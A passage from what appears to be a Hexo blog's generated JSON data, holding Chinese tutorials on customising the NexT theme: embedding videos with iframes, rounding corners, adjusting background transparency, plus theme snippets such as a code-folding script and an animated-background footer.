href=\"https://v.cuplayer.com/\">酷播云</a>，在国内还是比较快的。</p>\n<p>但是经过我使用发现，这个插件在网页中第一次加载时加载不出来视频，需要在进入网页后再进行一次刷新，有时候一篇文章看完了都不知道竟然还有一个视频。</p>\n<p><a href=\"https://nustarain.gitee.io/2023/09/08/tiangangfu/\"><strong>点击这里，查看效果</strong></a> 视频在最下面，看不到的话，刷新一下。</p>\n<p>具体的解决办法我并没有深究，好在发现了另一个办法。</p>\n<h3 id=\"iframe\"><a href=\"#iframe\" class=\"headerlink\" title=\"iframe\"></a>iframe</h3><p>除了使用 hexo-tag-dplayer 还有 H5 中的 iframe 标签也不错。可以通过以下代码引入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe style=<span class=\"string\">&#x27;width: 600px;height: 338px&#x27;</span> frameborder=<span class=\"string\">&#x27;no&#x27;</span> allowfullscreen mozallowfullscreen webkitallowfullscreen src=<span class=\"string\">&#x27;https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085&#x27;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>\n\n<p>也是直接替换掉 src 的内容就可以了。</p>\n<p><a href=\"https://liuxpblog.eu.org/2023/09/06/TianGang/\"><strong>点击这里，查看效果</strong></a></p>\n<h3 id=\"嵌入代码\"><a href=\"#嵌入代码\" class=\"headerlink\" title=\"嵌入代码\"></a>嵌入代码</h3><p>嵌入代码这个功能通常是有别的网站提供的，据我所知大部分视频网站都没有这个功能，YouTube 的嵌入代码做的还可以，哔哩哔哩也有，但是非常吝啬，清晰度非常次，必须要求登录，如果要求登录的话，还不如直接去官网登录观看呢。</p>\n<p><img src=\"/2023/12/16/blog-add-MM/1.png\" alt=\"嵌入代码\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe src=<span class=\"string\">&quot;//player.bilibili.com/player.html?aid=922182547&amp;bvid=BV1Uu4y1u7NQ&amp;cid=1364298943&amp;p=1&quot;</span> </span><br><span class=\"line\">        scrolling=<span class=\"string\">&quot;no&quot;</span> </span><br><span class=\"line\">        border=<span class=\"string\">&quot;0&quot;</span> </span><br><span class=\"line\">        frameborder=<span class=\"string\">&quot;no&quot;</span> </span><br><span class=\"line\">        framespacing=<span class=\"string\">&quot;0&quot;</span> </span><br><span class=\"line\">        allowfullscreen=<span class=\"string\">&quot;true&quot;</span>&gt; </span><br><span class=\"line\">&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> \n</iframe>"},{"title":"设置博客文章的圆角","date":"2023-09-09T10:06:49.000Z","_content":"\n同样启发与Win11，Win11最大的特点就是圆角的设计了，不得不说，真的是相比来说比较好看。\n\n那么也把自己的博客配置为圆角的设计吧。\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`variable: source/_data/variables.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\nPS：我这里取消注释的比较多，因为设置的比较多，单独说设置圆角的话，只需要取消注释`variable`即可。\n\n2. 按照`variable`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n```yml\n// 圆角设置\n$border-radius-inner     = 10px 10px 10px 10px;\n$border-radius           = 10px;\n```\n\n值越大，圆角弧度越大，按照个人喜好设置即可。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","source":"_posts/blog-fillet.md","raw":"---\ntitle: 设置博客文章的圆角\ndate: 2023-09-09 18:06:49\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n同样启发与Win11，Win11最大的特点就是圆角的设计了，不得不说，真的是相比来说比较好看。\n\n那么也把自己的博客配置为圆角的设计吧。\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`variable: source/_data/variables.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\nPS：我这里取消注释的比较多，因为设置的比较多，单独说设置圆角的话，只需要取消注释`variable`即可。\n\n2. 按照`variable`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n```yml\n// 圆角设置\n$border-radius-inner     = 10px 10px 10px 10px;\n$border-radius           = 10px;\n```\n\n值越大，圆角弧度越大，按照个人喜好设置即可。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","slug":"blog-fillet","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ex004d7zj3e9ew1z97","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>同样启发与Win11，Win11最大的特点就是圆角的设计了，不得不说，真的是相比来说比较好看。</p>\n<p>那么也把自己的博客配置为圆角的设计吧。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>取消注释</li>\n</ol>\n<p>打开<code>themes\\next\\_config.yml</code>文件。<br><kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。<br>取消<code>variable: source/_data/variables.styl</code>注释。</p>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"attr\">bodyEnd:</span> <span class=\"string\">source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">variable:</span> <span class=\"string\">source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<p>PS：我这里取消注释的比较多，因为设置的比较多，单独说设置圆角的话，只需要取消注释<code>variable</code>即可。</p>\n<ol start=\"2\">\n<li>按照<code>variable</code>的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。</li>\n</ol>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">//</span> <span class=\"string\">圆角设置</span></span><br><span class=\"line\"><span class=\"string\">$border-radius-inner</span>     <span class=\"string\">=</span> <span class=\"string\">10px</span> <span class=\"string\">10px</span> <span class=\"string\">10px</span> <span class=\"string\">10px;</span></span><br><span class=\"line\"><span class=\"string\">$border-radius</span>           <span class=\"string\">=</span> <span class=\"string\">10px;</span></span><br></pre></td></tr></table></figure>\n\n<p>值越大，圆角弧度越大，按照个人喜好设置即可。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>同样启发与Win11，Win11最大的特点就是圆角的设计了，不得不说，真的是相比来说比较好看。</p>\n<p>那么也把自己的博客配置为圆角的设计吧。</p>","more":"<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>取消注释</li>\n</ol>\n<p>打开<code>themes\\next\\_config.yml</code>文件。<br><kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。<br>取消<code>variable: source/_data/variables.styl</code>注释。</p>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"attr\">bodyEnd:</span> <span class=\"string\">source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">variable:</span> <span class=\"string\">source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<p>PS：我这里取消注释的比较多，因为设置的比较多，单独说设置圆角的话，只需要取消注释<code>variable</code>即可。</p>\n<ol start=\"2\">\n<li>按照<code>variable</code>的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。</li>\n</ol>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">//</span> <span class=\"string\">圆角设置</span></span><br><span class=\"line\"><span class=\"string\">$border-radius-inner</span>     <span class=\"string\">=</span> <span class=\"string\">10px</span> <span class=\"string\">10px</span> <span class=\"string\">10px</span> <span class=\"string\">10px;</span></span><br><span class=\"line\"><span class=\"string\">$border-radius</span>           <span class=\"string\">=</span> <span class=\"string\">10px;</span></span><br></pre></td></tr></table></figure>\n\n<p>值越大，圆角弧度越大，按照个人喜好设置即可。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>"},{"title":"设置博客背景的透明度","date":"2023-09-09T09:39:30.000Z","_content":"\n之前在[设置博客背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)的过程中，其实已经间接实现过设置博客背景透明度的功能了。   \n因为已经设置了博客背景“小飞棍”的特效，如果再把博客背景设置为透明的话，估计很多人会把持不住，在博客上玩起“小飞棍”吧。所以，就一直没有把博客背景设置为透明。\n\n直到前段时间有位朋友跟我说，如果是透明的，效果可能会更好一些。虽说当时我也跟她说过我的顾虑。但是我也打算尝试一下透明效果，毕竟之前设置的时候真的很美。\n\n闲话少叙，教程开始。\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n和配置背景图片时的操作差不多，打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`style: source/_data/styles.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\nPS：我这里取消注释的比较多，因为设置的比较多，单独说设置透明度的话，只需要取消注释`style`即可。\n\n2. 按照`style`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n```yml 折叠代码\n//文章背板的颜色rgb\n.main-inner > .sub-menu, .main-inner > .post-block, .main-inner > .tabs-comment, .main-inner > .comments, .main-inner > .pagination{\n\tbackground: #f5f5f56b;\t\t//此处使用十六进制颜色代码,也可以使用rgba进行调色,实际效果为白色透明色底板,rgba的第四参数即为透明度\n}\n\n//修改主体字体颜色\nbody{\t\t\t\t\n  color: #000;\t\t//纯黑\n}\n\n//标题颜色\n.posts-expand .post-title-link {\n    color: #000;\t\t\t\t//首页文章标题颜色， （默认为灰辨识度不高）\n}\n\n//标题下的日期颜色\n.posts-expand .post-meta-container {\n    color: #880000;\t\t\t\t//此处修改为红色,可自行调用rgb调色\n}\n\n//侧边框的透明度设置\n.sidebar {\n  opacity: 0.7;\n}\n\n//菜单栏的调色\n.header-inner {\t\t\n  background: rgba(255,0,255,0.7);\n}y\n\n//搜索框透明\n.popup {\t\t\n  opacity: 0.7;\n}\n\n//主体背景透明\n.main-inner {\n    background-color: rgba(255, 255, 255, 0);\n    padding: 0px 40px 40px 40px;  //调整组件位置\n}\n```\n\nPS：各项配置说明都标注得很清楚，按照自己的喜好进行设置即可。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","source":"_posts/blog-transparency.md","raw":"---\ntitle: 设置博客背景的透明度\ndate: 2023-09-09 17:39:30\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n之前在[设置博客背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)的过程中，其实已经间接实现过设置博客背景透明度的功能了。   \n因为已经设置了博客背景“小飞棍”的特效，如果再把博客背景设置为透明的话，估计很多人会把持不住，在博客上玩起“小飞棍”吧。所以，就一直没有把博客背景设置为透明。\n\n直到前段时间有位朋友跟我说，如果是透明的，效果可能会更好一些。虽说当时我也跟她说过我的顾虑。但是我也打算尝试一下透明效果，毕竟之前设置的时候真的很美。\n\n闲话少叙，教程开始。\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n和配置背景图片时的操作差不多，打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`style: source/_data/styles.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\nPS：我这里取消注释的比较多，因为设置的比较多，单独说设置透明度的话，只需要取消注释`style`即可。\n\n2. 按照`style`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n```yml 折叠代码\n//文章背板的颜色rgb\n.main-inner > .sub-menu, .main-inner > .post-block, .main-inner > .tabs-comment, .main-inner > .comments, .main-inner > .pagination{\n\tbackground: #f5f5f56b;\t\t//此处使用十六进制颜色代码,也可以使用rgba进行调色,实际效果为白色透明色底板,rgba的第四参数即为透明度\n}\n\n//修改主体字体颜色\nbody{\t\t\t\t\n  color: #000;\t\t//纯黑\n}\n\n//标题颜色\n.posts-expand .post-title-link {\n    color: #000;\t\t\t\t//首页文章标题颜色， （默认为灰辨识度不高）\n}\n\n//标题下的日期颜色\n.posts-expand .post-meta-container {\n    color: #880000;\t\t\t\t//此处修改为红色,可自行调用rgb调色\n}\n\n//侧边框的透明度设置\n.sidebar {\n  opacity: 0.7;\n}\n\n//菜单栏的调色\n.header-inner {\t\t\n  background: rgba(255,0,255,0.7);\n}y\n\n//搜索框透明\n.popup {\t\t\n  opacity: 0.7;\n}\n\n//主体背景透明\n.main-inner {\n    background-color: rgba(255, 255, 255, 0);\n    padding: 0px 40px 40px 40px;  //调整组件位置\n}\n```\n\nPS：各项配置说明都标注得很清楚，按照自己的喜好进行设置即可。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","slug":"blog-transparency","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ez004h7zj3fkpf2gwe","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>之前在<a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">设置博客背景图片</a>的过程中，其实已经间接实现过设置博客背景透明度的功能了。<br>因为已经设置了博客背景“小飞棍”的特效，如果再把博客背景设置为透明的话，估计很多人会把持不住，在博客上玩起“小飞棍”吧。所以，就一直没有把博客背景设置为透明。</p>\n<p>直到前段时间有位朋友跟我说，如果是透明的，效果可能会更好一些。虽说当时我也跟她说过我的顾虑。但是我也打算尝试一下透明效果，毕竟之前设置的时候真的很美。</p>\n<p>闲话少叙，教程开始。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>取消注释</li>\n</ol>\n<p>和配置背景图片时的操作差不多，打开<code>themes\\next\\_config.yml</code>文件。<br><kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。<br>取消<code>style: source/_data/styles.styl</code>注释。</p>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"attr\">bodyEnd:</span> <span class=\"string\">source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">variable:</span> <span class=\"string\">source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<p>PS：我这里取消注释的比较多，因为设置的比较多，单独说设置透明度的话，只需要取消注释<code>style</code>即可。</p>\n<ol start=\"2\">\n<li>按照<code>style</code>的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。</li>\n</ol>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 